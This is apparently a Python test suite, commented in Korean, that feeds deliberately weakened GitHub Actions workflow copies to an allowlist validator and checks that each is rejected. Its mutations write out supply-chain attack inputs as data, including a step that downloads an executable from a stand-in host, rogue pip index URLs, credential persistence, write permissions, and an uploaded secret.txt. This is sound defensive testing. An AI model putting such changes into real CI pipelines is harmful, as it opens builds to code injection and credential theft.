"""`ci.yml`·`package.yml` 허용 목록 규칙(`tests/workflow_golden.py`) 시험 — AS-S2 권고-7(결정 D-693).

감사 공급망 탐침(`probe_workflow_mutations.py`)이 안전 장치를 약하게 만든 사본 열한 개를 만들어 기존 시험을 돌렸더니 모두 통과했다. 이 시험은 그 열한 개를 글자 그대로 옮겨(진짜 워크플로 글에서 한 곳만 바꾼다)
**허용 목록 규칙이 모두 잡는지** 본다 — 대조군(좋은 글은 통과)과 같은 계열의 다른 약화(`if:`·`continue-on-error`·`env`·`with` 키 끼우기·단계 빼기·액션 갱신)도 함께 본다.
같은 규칙을 이미 있는 시험 묶음(`test_repo_layout.CiWorkflowTest`·`WorkflowPinningTest`, `test_packaging_workflow.RealWorkflowTest`, `test_ci_shard.CiWorkflowShardTest`)에도 한 가지씩 걸어 두었다 —
감사 탐침이 그 묶음만 돌려도 열한 개가 모두 빨개진다. 이 파일은 `.github/` 를 읽기만 한다(바꾸지 않는다). 네트워크 없이 돈다.

열한 개:
  ci.yml      ① 작업 단위 `permissions` 에 contents·id-token 쓰기 ② checkout 의 소유자·저장소 이름 바꾸기(40자리 SHA 모양만 맞춤) ③ checkout 의 SHA 값 바꾸기 ④ `persist-credentials: true`
              ⑤ matrix 의 os 에 `self-hosted` ⑥ 작업 단위 `env` 에 `PYTHONPATH`
  package.yml ⑦ 다른 `run` 단계 추가(내려받기 명령) ⑧ 한 줄 흐름식 단계로 태그 액션 추가 ⑨ pip 설치에 `--extra-index-url` ⑩ 빌드 명령을 문자열 출력으로 바꾸기(경로 글자만 남음) ⑪ `persist-credentials: true`
"""
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(Path(__file__).resolve().parent))
import workflow_golden as golden  # noqa: E402

OLD_SHA = golden.ACTIONS["actions/checkout"]
UPLOAD_HEAD = "      # SHA 는 이 초안을 만든 PC"


def real(name):
    return (ROOT / ".github" / "workflows" / name).read_bytes().decode("utf-8").replace("\r\n", "\n")


def change(text, old, new):
    if text.count(old) != 1:
        raise AssertionError("변이를 적용하지 못했다(원문이 한 번만 나와야 한다): " + repr(old[:60]) + " 횟수 " + str(text.count(old)))
    return text.replace(old, new, 1)


CI_MUTATIONS = {
    "① 작업 단위 permissions 에 contents·id-token 쓰기": lambda text: change(text, "    timeout-minutes: 40\n", "    timeout-minutes: 40\n    permissions:\n      contents: write\n      id-token: write\n"),
    "② checkout 의 소유자·저장소를 다른 이름으로(40자리 모양만 맞춤)": lambda text: change(text, "actions/checkout@" + OLD_SHA, "canary-org/checkout@" + "a" * 40),
    "③ checkout 의 SHA 를 다른 40자리로": lambda text: change(text, "actions/checkout@" + OLD_SHA, "actions/checkout@" + "b" * 40),
    "④ persist-credentials 를 true 로": lambda text: change(text, "persist-credentials: false", "persist-credentials: true"),
    "⑤ matrix 의 os 에 self-hosted 추가": lambda text: change(text, "os: [ubuntu-latest, windows-latest]", "os: [ubuntu-latest, windows-latest, self-hosted]"),
    "⑥ 작업 단위 env 에 PYTHONPATH": lambda text: change(text, "    timeout-minutes: 40\n", "    timeout-minutes: 40\n    env:\n      PYTHONPATH: CANARY_ELSEWHERE\n"),
}
PACKAGE_MUTATIONS = {
    "⑦ 다른 run 단계를 하나 더(내려받기 명령)": lambda text: change(text, UPLOAD_HEAD, "      - name: CANARY 추가 단계\n        run: Invoke-WebRequest -Uri 'CANARY.invalid/x' -OutFile \"$env:RUNNER_TEMP/x.exe\"\n\n" + UPLOAD_HEAD),
    "⑧ 한 줄 흐름식 단계로 태그 액션 추가": lambda text: change(text, UPLOAD_HEAD, "      - {uses: actions/cache@v4}\n\n" + UPLOAD_HEAD),
    "⑨ pip 설치에 추가 색인": lambda text: change(text, "run: python -m pip install -r packaging/requirements-package.txt", "run: python -m pip install --extra-index-url CANARY.invalid/simple -r packaging/requirements-package.txt"),
    "⑩ 빌드 명령을 문자열 출력으로(경로 글자만 남음)": lambda text: change(text, 'run: python packaging/build_package.py --out-dir "$env:RUNNER_TEMP/package"', "run: python -c \"print('packaging/build_package.py')\""),
    "⑪ persist-credentials 를 true 로": lambda text: change(text, "persist-credentials: false", "persist-credentials: true"),
}
# 같은 계열의 다른 약화 — 감사의 열한 개 말고도 허용 목록이 잡아야 하는 것
CI_OTHER = {
    "단계에 if": lambda text: change(text, "      - name: 시험 실행(조각 ${{ matrix.shard }}/3)\n", "      - name: 시험 실행(조각 ${{ matrix.shard }}/3)\n        if: always()\n"),
    "단계에 continue-on-error": lambda text: change(text, "        run: python scripts/ci_shard.py\n", "        run: python scripts/ci_shard.py\n        continue-on-error: true\n"),
    "run 끝에 || true": lambda text: change(text, "run: python scripts/ci_shard.py\n", "run: python scripts/ci_shard.py || true\n"),
    "시험 단계의 env 에 키를 더함": lambda text: change(text, "          CI_SHARD_TOTAL: '3'\n", "          CI_SHARD_TOTAL: '3'\n          PIP_INDEX_URL: CANARY.invalid\n"),
    "조각 수를 바꿈": lambda text: change(text, "          CI_SHARD_TOTAL: '3'\n", "          CI_SHARD_TOTAL: '2'\n"),
    "matrix 에 include": lambda text: change(text, "        shard: [1, 2, 3]\n", "        shard: [1, 2, 3]\n        include:\n          - os: self-hosted\n"),
    "matrix 에 exclude": lambda text: change(text, "        shard: [1, 2, 3]\n", "        shard: [1, 2, 3]\n        exclude:\n          - os: windows-latest\n"),
    "runs-on 을 고정 값으로": lambda text: change(text, "    runs-on: ${{ matrix.os }}\n", "    runs-on: self-hosted\n"),
    "작업 단위 if": lambda text: change(text, "    timeout-minutes: 40\n", "    timeout-minutes: 40\n    if: github.ref == 'refs/heads/main'\n"),
    "checkout 의 with 에 키를 더함": lambda text: change(text, "          persist-credentials: false\n", "          persist-credentials: false\n          token: CANARY.invalid\n"),
    "setup-python 의 버전을 고정": lambda text: change(text, "          python-version: ${{ matrix.python }}\n", "          python-version: '3.12'\n"),
    "단계 하나를 뺌": lambda text: change(text, "      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065  # v5.6.0\n        with:\n          python-version: ${{ matrix.python }}\n\n", ""),
    "트리거에 pull_request_target": lambda text: change(text, "on:\n  push:\n  workflow_dispatch:\n", "on:\n  push:\n  pull_request_target:\n  workflow_dispatch:\n"),
    "최상위 permissions 를 쓰기로": lambda text: change(text, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n"),
    "액션 하나가 태그": lambda text: change(text, "actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065", "actions/setup-python@v5"),
    "흐름식 matrix 한 줄을 다른 곳에 끼움": lambda text: change(text, "      fail-fast: false\n", "      fail-fast: false\n      max-parallel: [1]\n"),
}
PACKAGE_OTHER = {
    "작업 단위 permissions": lambda text: change(text, "    timeout-minutes: 30\n", "    timeout-minutes: 30\n    permissions:\n      contents: write\n"),
    "작업 env 에 키를 더함": lambda text: change(text, "      PYTHONUTF8: '1'\n", "      PYTHONUTF8: '1'\n      PIP_INDEX_URL: CANARY.invalid\n"),
    "단계에 if": lambda text: change(text, "      - name: SHA-256 보기", "      - if: always()\n        name: SHA-256 보기"),
    "단계에 shell": lambda text: change(text, "        run: Get-Content \"$env:RUNNER_TEMP/package/release/SHA256SUMS\"\n", "        shell: cmd\n        run: Get-Content \"$env:RUNNER_TEMP/package/release/SHA256SUMS\"\n"),
    "올리는 파일을 더함": lambda text: change(text, "            ${{ runner.temp }}/package/release/PACKAGE_INFO.json\n", "            ${{ runner.temp }}/package/release/PACKAGE_INFO.json\n            ${{ runner.temp }}/package/work/secret.txt\n"),
    "보존 기간을 늘림": lambda text: change(text, "retention-days: 14", "retention-days: 90"),
    "산출물 이름을 바꿈": lambda text: change(text, "name: ChanceBlogDesktop-preview", "name: ChanceBlogDesktop-release"),
    "트리거에 push": lambda text: change(text, "on:\n  workflow_dispatch:\n", "on:\n  push:\n  workflow_dispatch:\n"),
    "입력칸을 더함": lambda text: change(text, "on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n    inputs:\n      note:\n        type: string\n"),
    "서명 단계를 더함": lambda text: change(text, UPLOAD_HEAD, "      - name: 서명\n        run: signtool sign /f x.pfx x.exe\n\n" + UPLOAD_HEAD),
    "단계를 뺌": lambda text: change(text, "      - name: SHA-256 보기(공개 값이다 — 운영자가 개인 PC 에서 대조한다)\n        run: Get-Content \"$env:RUNNER_TEMP/package/release/SHA256SUMS\"\n\n", ""),
    "runner 를 바꿈": lambda text: change(text, "runs-on: windows-latest", "runs-on: ubuntu-latest"),
    "setup-python 의 버전": lambda text: change(text, "python-version: '3.12'", "python-version: '3.13'"),
    "upload-artifact 의 SHA": lambda text: change(text, "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02", "actions/upload-artifact@" + "c" * 40),
}


class ApprovedStructureTest(unittest.TestCase):
    def test_the_real_workflows_are_exactly_the_approved_structure(self):
        self.assertEqual(golden.ci_problems(real("ci.yml")), [])
        self.assertEqual(golden.package_problems(real("package.yml")), [])

    def test_a_windows_line_ending_does_not_change_the_verdict(self):
        self.assertEqual(golden.ci_problems(real("ci.yml").replace("\n", "\r\n")), [])
        self.assertEqual(golden.package_problems(real("package.yml").replace("\n", "\r\n")), [])

    def test_every_action_in_every_workflow_is_one_of_the_approved_owner_repo_and_commit_pairs(self):
        found = 0
        for path in sorted((ROOT / ".github" / "workflows").glob("*.y*ml")):
            text = path.read_bytes().decode("utf-8")
            with self.subTest(file=path.name):
                self.assertEqual(golden.action_problems(text), [])
            found += len(golden.all_action_refs(text))
        self.assertGreaterEqual(found, 8, "액션을 찾지 못했다 — 찾기 규칙이 깨졌다")

    def test_the_approved_pairs_are_three_actions_each_pinned_to_a_full_commit(self):
        self.assertEqual(set(golden.ACTIONS), {"actions/checkout", "actions/setup-python", "actions/upload-artifact"})
        for name, sha in golden.ACTIONS.items():
            with self.subTest(action=name):
                self.assertRegex(sha, r"^[0-9a-f]{40}$")


class TheElevenWeakenedCopiesAreCaughtTest(unittest.TestCase):
    """감사 탐침이 통과시킨 열한 개 — 이 규칙은 모두 잡는다."""

    def test_each_weakened_ci_copy_is_refused(self):
        original = real("ci.yml")
        for label, mutate in CI_MUTATIONS.items():
            with self.subTest(mutation=label):
                self.assertTrue(golden.ci_problems(mutate(original)), "약해진 ci.yml 이 통과했다")

    def test_each_weakened_package_copy_is_refused(self):
        original = real("package.yml")
        for label, mutate in PACKAGE_MUTATIONS.items():
            with self.subTest(mutation=label):
                self.assertTrue(golden.package_problems(mutate(original)), "약해진 package.yml 이 통과했다")

    def test_the_right_rule_names_each_weakening(self):
        """어느 규칙이 잡았는지 — 우연히 다른 이유로 읽기 실패해서 걸린 것이 아니다."""
        ci, package = real("ci.yml"), real("package.yml")
        expected = {
            "①": ("작업 키", golden.ci_problems(CI_MUTATIONS["① 작업 단위 permissions 에 contents·id-token 쓰기"](ci))),
            "②": ("액션", golden.ci_problems(CI_MUTATIONS["② checkout 의 소유자·저장소를 다른 이름으로(40자리 모양만 맞춤)"](ci))),
            "③": ("액션", golden.ci_problems(CI_MUTATIONS["③ checkout 의 SHA 를 다른 40자리로"](ci))),
            "④": ("with", golden.ci_problems(CI_MUTATIONS["④ persist-credentials 를 true 로"](ci))),
            "⑤": ("strategy", golden.ci_problems(CI_MUTATIONS["⑤ matrix 의 os 에 self-hosted 추가"](ci))),
            "⑥": ("작업 키", golden.ci_problems(CI_MUTATIONS["⑥ 작업 단위 env 에 PYTHONPATH"](ci))),
            "⑦": ("단계 목록", golden.package_problems(PACKAGE_MUTATIONS["⑦ 다른 run 단계를 하나 더(내려받기 명령)"](package))),
            "⑧": ("읽을 수 없는 표기", golden.package_problems(PACKAGE_MUTATIONS["⑧ 한 줄 흐름식 단계로 태그 액션 추가"](package))),
            "⑨": ("run 명령", golden.package_problems(PACKAGE_MUTATIONS["⑨ pip 설치에 추가 색인"](package))),
            "⑩": ("run 명령", golden.package_problems(PACKAGE_MUTATIONS["⑩ 빌드 명령을 문자열 출력으로(경로 글자만 남음)"](package))),
            "⑪": ("with", golden.package_problems(PACKAGE_MUTATIONS["⑪ persist-credentials 를 true 로"](package))),
        }
        for label, (word, problems) in expected.items():
            with self.subTest(mutation=label):
                self.assertTrue(any(word in problem for problem in problems), (word, problems))

    def test_other_weakenings_of_the_same_kind_are_refused_too(self):
        ci, package = real("ci.yml"), real("package.yml")
        for label, mutate in CI_OTHER.items():
            with self.subTest(ci=label):
                self.assertTrue(golden.ci_problems(mutate(ci)), "약해진 ci.yml 이 통과했다")
        for label, mutate in PACKAGE_OTHER.items():
            with self.subTest(package=label):
                self.assertTrue(golden.package_problems(mutate(package)), "약해진 package.yml 이 통과했다")

    def test_an_unreadable_or_odd_text_is_a_problem_not_a_crash(self):
        for text in ("", "not: [a mapping", "﻿name: x\n", "a: 1\n\tb: 2\n", "- a\n- b\n", "name: x\n" * 3):
            with self.subTest(text=text[:20]):
                self.assertTrue(golden.ci_problems(text))
                self.assertTrue(golden.package_problems(text))


if __name__ == "__main__":
    unittest.main()
